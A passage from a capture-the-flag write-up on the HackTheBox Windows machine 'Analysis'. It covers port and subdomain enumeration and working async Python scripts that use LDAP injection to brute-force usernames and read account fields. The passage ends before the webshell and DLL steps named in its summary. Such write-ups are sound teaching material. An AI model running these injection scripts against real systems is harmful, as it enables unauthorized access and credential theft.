---
title: HTB: Analysis
url: https://0xdf.gitlab.io/2024/06/01/htb-analysis.html
date: 2024-06-01T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, htb-analysis, hackthebox, nmap, windows, netexec, ffuf, subdomain, feroxbuster, upload, webshell, hta, ldap, ldap-injection, python, python-async, python-httpx, autologon-credentials, web-logs, evil-winrm, snort, snort-dynamic-preprocessor, msfvenon, htb-support
---

![Analysis](/img/analysis-cover.png)

Analysis starts with a PHP site that uses LDAP to query a user from active directory. I’ll use LDAP injection to brute-force users, and then to read the description field of a shared account, which has the password. That grants access to the admin panel, where I’ll abuse an upload feature two ways - writing a webshell and getting execution via an HTA file. I’ll find credentials for the next user in autologon registry values and in web logs. To get administrator, I’ll abuse the Snort dynamic preprocessor feature writing a malicious DLL to where Snort will load it.

## Box Info

| Name | [Analysis](https://hackthebox.com/machines/analysis)  [Analysis](https://hackthebox.com/machines/analysis) [Play on HackTheBox](https://hackthebox.com/machines/analysis) |
| --- | --- |
| Release Date | [20 Jan 2024](https://twitter.com/hackthebox_eu/status/1748027506249068873) |
| Retire Date | 01 Jun 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Analysis |
| Radar Graph | Radar chart for Analysis |
| First Blood User | 02:00:48[myDonut myDonut](https://app.hackthebox.com/users/29383) |
| First Blood Root | 02:54:13[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [UVision UVision](https://app.hackthebox.com/users/70653) |

## Recon

### nmap

`nmap` finds many open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.250
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-29 14:05 EDT
Nmap scan report for 10.10.11.250
Host is up (0.095s latency).
Not shown: 65507 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3306/tcp  open  mysql
5985/tcp  open  wsman
9389/tcp  open  adws
33060/tcp open  mysqlx
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49694/tcp open  unknown
49709/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49678,49679,49694,49709 -sCV 10.10.11.250
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-29 14:10 EDT
Nmap scan report for 10.10.11.250
Host is up (0.093s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-29 18:10:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.80%I=7%D=5/29%Time=66576FA0%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33060-TCP:V=7.80%I=7%D=5/29%Time=66576FA0%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0
SF:\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFourRequest,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,46
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88'\x1a\*Parse
SF:\x20error\x20unserializing\x20protobuf\x20message\"\x05HY000")%r(SIPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
SF:Y000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05
SF:\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\x20message-frame\.\"\x05HY
SF:000")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -6s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-05-29T18:12:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 288.91 seconds

```

It’s clearly a Windows box, and based on the combination of Kerberos (TCP 88), DNS (TCP 53), and LDAP (TCP 389, others), it’s likely a domain controller.

The domain `analysis.htb` is returned from the LDAP enumeration scripts.

I’ll check the MySQL port real quick, but my IP is not authorized:

```

oxdf@hacky$ mysql -h 10.10.11.250
ERROR 1130 (HY000): Host '10.10.14.6' is not allowed to connect to this MySQL server

```

Triaging where to go from here:
- Tier 1: Web page and virtual hosts, basic SMB enumeration
- Tier 2: LDAP, DNS
- Tier 3: Kerberos brute force
- With creds: WinRM (5985), MySQL (TCP 3306 / 33060)

### SMB - TCP 445

`netexec` gives a hostname and confirms the domain name:

```

oxdf@hacky$ netexec smb 10.10.11.250
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)

```

Given the hostname of `DC-ANALYSIS`, it is likely a domain controller.

There’s no unauthenticated access to the SMB shares:

```

oxdf@hacky$ netexec smb 10.10.11.250 --shares
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [-] Error getting user: list index out of range
SMB         10.10.11.250    445    DC-ANALYSIS      [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
oxdf@hacky$ netexec smb 10.10.11.250 -u guest -p '' --shares
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [-] analysis.htb\guest: STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec smb 10.10.11.250 -u 0xdf -p 0xdf --shares
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [-] analysis.htb\0xdf:0xdf STATUS_LOGON_FAILURE 

```

### Subdomain Bruteforce

I’ll try brute forcing for subdomains on the HTTP server using `ffuf`:

```

oxdf@hacky$ ffuf -u http://10.10.11.250 -H "Host: FUZZ.analysis.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.250
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.analysis.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 95ms]
:: Progress: [19966/19966] :: Job [1/1] :: 210 req/sec :: Duration: [0:01:35] :: Errors: 0 ::

```

It quickly identifies the `internal.analysis.htb` domain, which is returning 403. I’ll add it along with the domain to my `/etc/hosts` file:

```
10.10.11.250 analysis.htb internal.analysis.htb

```

### analysis.htb - TCP 80

#### Site

Visiting the site by IP address returns a 404 error:

![image-20240529144702055](/img/image-20240529144702055.png)

This is a default IIS 404 page.

Visiting `analysis.htb` gives a website for some kind of cybersecurity firm:

![image-20240529145520796](/img/image-20240529145520796.png)

None of the links on the page go anywhere else.

#### Tech Stack

Interestingly, `nmap` showed headers of `Microsoft HTTPAPI httpd 2.0`, but the response headers I see show IIS:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Sat, 08 Jul 2023 09:20:59 GMT
Accept-Ranges: bytes
ETag: "ddc152827db1d91:0"
Server: Microsoft-IIS/10.0
Date: Wed, 29 May 2024 19:03:22 GMT
Connection: close
Content-Length: 17830

```

That matches the 404 page identified above.

The page loads as `index.html`, suggesting a static site. The 404 page here is a different but also standard IIS 404 page:

![image-20240529150632572](/img/image-20240529150632572.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, using a lowercase wordlist since IIS is case-insensitive and I won’t want to recurse into directories multiple times:

```

oxdf@hacky$ feroxbuster -u http://analysis.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://analysis.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       91w     1273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      158c http://analysis.htb/js => http://analysis.htb/js/
301      GET        2l       10w      162c http://analysis.htb/images => http://analysis.htb/images/
301      GET        2l       10w      159c http://analysis.htb/css => http://analysis.htb/css/
200      GET      287l     1674w    17830c http://analysis.htb/
301      GET        2l       10w      171c http://analysis.htb/images/fancybox => http://analysis.htb/images/fancybox/
301      GET        2l       10w      159c http://analysis.htb/bat => http://analysis.htb/bat/
400      GET        6l       26w      324c http://analysis.htb/error%1F_log
400      GET        6l       26w      324c http://analysis.htb/js/error%1F_log
400      GET        6l       26w      324c http://analysis.htb/images/error%1F_log
400      GET        6l       26w      324c http://analysis.htb/css/error%1F_log
400      GET        6l       26w      324c http://analysis.htb/images/fancybox/error%1F_log
400      GET        6l       26w      324c http://analysis.htb/bat/error%1F_log
[####################] - 1m    159504/159504  0s      found:12      errors:0      
[####################] - 57s    26584/26584   463/s   http://analysis.htb/ 
[####################] - 57s    26584/26584   464/s   http://analysis.htb/js/ 
[####################] - 57s    26584/26584   464/s   http://analysis.htb/images/ 
[####################] - 57s    26584/26584   462/s   http://analysis.htb/css/ 
[####################] - 57s    26584/26584   465/s   http://analysis.htb/images/fancybox/ 
[####################] - 57s    26584/26584   464/s   http://analysis.htb/bat/ 

```

`/bat/` is the most interesting thing here, but it returns 403 forbidden, and brute forcing inside it didn’t find anything.

### internal.analysis.htb - TCP 80

#### Site

As `ffuf` pointed out, this site is returning an IIS 403 Forbidden:

![image-20240529152749346](/img/image-20240529152749346.png)

#### Directory Brute Force

I’ll run `feroxbuster` here as well. To get what I need to continue, I need to guess that the site is running on PHP, or use a wordlist that has files with extensions in it. I think this is pretty poor design for a HTB machine, but it is something that can happen in the real world. I’ll use `-x php`:

```

oxdf@hacky$ feroxbuster -u http://internal.analysis.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.analysis.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       91w     1273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       29l       93w     1284c http://internal.analysis.htb/
301      GET        2l       10w      170c http://internal.analysis.htb/users => http://internal.analysis.htb/users/
301      GET        2l       10w      174c http://internal.analysis.htb/dashboard => http://internal.analysis.htb/dashboard/
200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/css => http://internal.analysis.htb/dashboard/css/
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/js => http://internal.analysis.htb/dashboard/js/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img => http://internal.analysis.htb/dashboard/img/
302      GET        1l        1w        3c http://internal.analysis.htb/dashboard/logout.php => ../employees/login.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib => http://internal.analysis.htb/dashboard/lib/
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads => http://internal.analysis.htb/dashboard/uploads/
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/upload.php
200      GET        4l        5w       38c http://internal.analysis.htb/dashboard/index.php
301      GET        2l       10w      174c http://internal.analysis.htb/employees => http://internal.analysis.htb/employees/
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/form.php
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/tickets.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/details.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/emergency.php
301      GET        2l       10w      184c http://internal.analysis.htb/dashboard/lib/chart => http://internal.analysis.htb/dashboard/lib/chart/
400      GET        6l       26w      324c http://internal.analysis.htb/users/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/users/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/employees/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/employees/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/img/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/img/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/css/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/css/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/uploads/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/uploads/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/js/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/js/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/lib/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/lib/error%1F_log.php
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/lib/chart/error%1F_log
400      GET        6l       26w      324c http://internal.analysis.htb/dashboard/lib/chart/error%1F_log.php
[####################] - 3m    265840/265840  0s      found:39      errors:1
[####################] - 3m     26584/26584   146/s   http://internal.analysis.htb/
[####################] - 2m     26584/26584   151/s   http://internal.analysis.htb/users/
[####################] - 3m     26584/26584   145/s   http://internal.analysis.htb/dashboard/
[####################] - 3m     26584/26584   145/s   http://internal.analysis.htb/dashboard/css/
[####################] - 3m     26584/26584   145/s   http://internal.analysis.htb/dashboard/js/
[####################] - 3m     26584/26584   146/s   http://internal.analysis.htb/dashboard/img/
[####################] - 3m     26584/26584   145/s   http://internal.analysis.htb/dashboard/lib/
[####################] - 3m     26584/26584   145/s   http://internal.analysis.htb/dashboard/uploads/
[####################] - 3m     26584/26584   147/s   http://internal.analysis.htb/employees/
[####################] - 3m     26584/26584   147/s   http://internal.analysis.htb/dashboard/lib/chart/

```

There’s a bunch of potentially interesting paths in there, and I’ll specifically want to check out the ones that returned 200:
- `/users/list.php`
- `/dashboard/upload.php`
- `/dashboard/index.php`
- `/dashboard/form.php`
- `/dashboard/tickets.php`
- `/dashboard/details.php`
- `/dashboard/emergency.php`
- `/employees/login.php`

All of the `dashboard` paths return an empty page.

`/employees/login.php` presents a login form:

![image-20240530143629932](/img/image-20240530143629932.png)

There’s also an `/dashboard/uploads` directory. Nothing was identified in it, but something to keep in mind.

#### users

`/users/list.php` returns a message:

![image-20240529155916719](/img/image-20240529155916719.png)

Fuzzing for parameters with `ffuf` shows a different response when `?name=` is sent:

```

oxdf@hacky$ ffuf -u http://internal.analysis.htb/users/list.php?FUZZ= -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?FUZZ=
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 106ms]
:: Progress: [12334/12334] :: Job [1/1] :: 410 req/sec :: Duration: [0:00:30] :: Errors: 0 ::

```

Trying that in Firefox, it returns an empty table:

![image-20240529160342936](/img/image-20240529160342936.png)

## Shell as svc\_web

### Access Dashboard

#### Identify LDAP

When the `name` parameter is blank, it returns this single row with a username of “CONTACT\_”. This is weird. My first thought is to try `name=b`, as “b” isn’t in “CONTACT\_”, but it returns the same thing. When I try `name=b*`, it changes:

![image-20240529162023595](/img/image-20240529162023595.png)

It looks like “\*” is being used as a wildcard.

It’s also worth noting that the column headers in the table line up very nicely with [standard LDAP fields](https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html).

#### LDAP Injection

The “\*” as wildcard is classic LDAP injection. The LDAP query probably looks something like `&(sAMAccountName=$_GET['name'])`. If that’s the case, then I can try to inject into it. I already showed `b*` worked to get “badam”. “b\*m” works as well:

![image-20240530134749758](/img/image-20240530134749758.png)

Interestingly, “b\*a\*” works, but “b\*\*” does not:

![image-20240530134831895](/img/image-20240530134831895.png)

The last name field is “sn” for sirname, and I can inject to query for that as well:

![image-20240530135031878](/img/image-20240530135031878.png)

From my envisioned query above, that would make:

```

&(sAMAccountName=*)(sn=adam)

```

#### Brute Force Users

I’m going to write a Python script for this, using `httpx` and `asyncio` to make it go fast. It is probably enough to just run 26 times and look for names starting with each letter, but I’ll be thorough and check all possible combinations.

My main function is as follows:

```

async def main():
    async with httpx.AsyncClient() as client:
        queue = asyncio.Queue()
        print('[*] Brute-forcing names...')
        names = []
        for letter in ascii_lowercase:
            queue.put_nowait(letter)

        workers = [asyncio.create_task(worker(queue, names, client)) for _ in range(50)]

        await queue.join()

        for _ in workers:
            queue.put_nowait(None)
        
        await asyncio.gather(*workers)

        print(f"[+] Found {len(names)} names:\n  ", end='')
        print('\n  '.join(names))

asyncio.run(main())

```

It will create an `httpx` client and a queue to hold tasks. I’ll start the queue with each lowercase letter. Then I create a bunch of worker tasks, each of which is a call to the `worker` function, passing in the queue, an empty list for the results, and the client.

`await queue.join()` will wait until all the items in the queue have had `task_done()` called, and there are no unfinished tasks left.

Then I’ll add a `None` to the queue for each worker. This is a signal to the `worker` function that it can return so they aren’t just left hanging.

`await asyncio.gather(*workers)` waits for the tasks to all return. The results are then printed. Because the list is passed by reference in Python, and I’m only appending to it, it’s a safe way to share between tasks. I’ll go a more complex route in the next script.

The `worker` function handles items from the queue until it gets a `None`:

```

async def worker(queue, results, client):
    while True:
        str_to_check = await queue.get()
        if str_to_check is None:
            queue.task_done()
            break
        exact_match = await test_str(client, str_to_check)
        if exact_match is True:
            assert str_to_check not in results
            results.append(str_to_check)
        if exact_match is not None:
            for l in ascii_lowercase:
                queue.put_nowait(f'{str_to_check}{l}')

        queue.task_done()

```

It starts as an infinite loop, getting an item from the queue. If that’s `None`, it marks the task done and break the loop, returning. Then it calls `test_str`, which has three possible returns:
- `True` - The string is an exact match for a name.
- `False` - The string is a match, but not exact.
- `None` - The string doesn’t match at all.

If the result is `True` (there’s an exact match), then it adds the string to the results. If it is not `None` (so `True` or `False`, it was a partial match, so it adds tasks to the queue for all the next possible letters. Then it marks this task done and loops.

`test_str` uses the client to query the webserver:

```

async def test_str(client, str_to_check) -> bool|None:
    resp = await client.get(f'http://internal.analysis.htb/users/list.php?name={str_to_check}*')
    if "CONTACT_" in resp.text:
        return None
    resp2 = await client.get(f'http://internal.analysis.htb/users/list.php?name={str_to_check}')
    return "CONTACT_" not in resp2.text

```

The first time it appends a wildcard, and if there’s no match, it returns `None`. If it matches with a wildcard, it tries without the wildcare, and returns accordingly.

The final script is:

```

#!/usr/bin/env python3

import asyncio
import httpx
from string import ascii_lowercase

async def test_str(client, str_to_check) -> bool|None:
    resp = await client.get(f'http://internal.analysis.htb/users/list.php?name={str_to_check}*')
    if "CONTACT_" in resp.text:
        return None
    resp2 = await client.get(f'http://internal.analysis.htb/users/list.php?name={str_to_check}')
    return "CONTACT_" not in resp2.text

async def worker(queue, results, client):
    while True:
        str_to_check = await queue.get()
        if str_to_check is None:
            queue.task_done()
            break
        exact_match = await test_str(client, str_to_check)
        if exact_match is True:
            assert str_to_check not in results
            results.append(str_to_check)
        if exact_match is not None:
            for l in ascii_lowercase:
                queue.put_nowait(f'{str_to_check}{l}')

        queue.task_done()

async def main():
    async with httpx.AsyncClient() as client:
        queue = asyncio.Queue()
        print('[*] Brute-forcing names...')
        names = []
        for letter in ascii_lowercase:
            queue.put_nowait(letter)

        workers = [asyncio.create_task(worker(queue, names, client)) for _ in range(50)]

        await queue.join()

        for _ in workers:
            queue.put_nowait(None)

        await asyncio.gather(*workers)

        print(f"[+] Found {len(names)} names:\n  ", end='')
        print('\n  '.join(names))

asyncio.run(main())

```

That script runs in less than five seconds, sending almost 900 requests, and identifies five users:

```

oxdf@hacky$ time python ldap_brute_users.py 
[*] Brute-forcing names...
[+] Found 5 names:
  lzen
  badam
  jangel
  amanson
  technician

real    0m4.441s
user    0m1.303s
sys     0m0.185s

```

#### Read Field

Now I’ll write another script to read field values. The strategy changes slightly here. Now I’m going to specify a username and then get the value from a field. That means there’s only one right answer. I also have a bigger alphabet, including lower, upper, digits, and special characters. I’m going to remove `()` from the list, as that just breaks the injection (hopefully I don’t need it).

I’ll start with a bit of setup to take in a username and a field to target:

```

alphabet = [c for c in printable[:-5] if c not in '()']
if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <user> <field>")
    exit(1)

username = sys.argv[1]
field = sys.argv[2]
asyncio.run(main())

```

`main` looks very similar to the previous, with a few changes:

```

async def main():
    async with httpx.AsyncClient() as client:
        queue = asyncio.Queue()
        temp_value = ''
        value = Result()
        print(f'[*] Brute-forcing {field} for {username}...')
        while True:
            for letter in alphabet:
                queue.put_nowait(f'{temp_value}{quote(letter)}')

            workers = [asyncio.create_task(worker(queue, value, client)) for _ in range(50)]

            await queue.join()

            for _ in workers:
                queue.put_nowait(None)
            
            await asyncio.gather(*workers)
        
            if temp_value == f'{value.value}*':
                break
            temp_value = value.value + '*'

        print(f"\r[+] {username}'s {field}: {value.value}")

```

Rather than a list, I’m keeping the result in a `Result` class. It’s just a simple class with a single attribute:

```

@dataclass
class Result:
    value: str = ''

```

